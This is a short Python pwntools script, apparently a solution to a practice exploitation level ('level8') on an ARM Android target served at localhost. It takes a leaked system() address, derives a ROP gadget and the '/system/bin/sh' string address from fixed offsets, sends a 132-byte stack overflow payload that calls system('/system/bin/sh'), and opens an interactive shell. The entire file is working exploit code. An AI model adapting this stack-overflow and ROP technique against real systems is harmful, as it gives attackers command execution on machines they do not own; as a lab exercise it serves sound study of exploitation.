#!/usr/bin/env python
from pwn import *
 
#p = process('./level8')
p = remote('127.0.0.1',10001)

system_addr_str = p.recvuntil('\n')
system_addr = int(system_addr_str,16)
print "system_addr = " + hex(system_addr)

p.recvuntil('\n')

#.text:000253A4                 EXPORT system

#0x00034ace : ldr r0, [sp] ; pop {r1, r2, r3, pc}
gadget1 = system_addr + (0x00034ace - 0x000253A4)
print "gadget1 = " + hex(gadget1)

#.rodata:0003F9B4 aSystemBinSh    DCB "/system/bin/sh",0
r0 = system_addr + (0x0003F9B4 - 0x000253A4) - 1
print "/system/bin/sh addr = " + hex(r0)

payload =  '\x00'*132 + p32(gadget1) + p32(r0) + "\x00"*0x8 + p32(system_addr)

p.send(payload)
 
p.interactive()

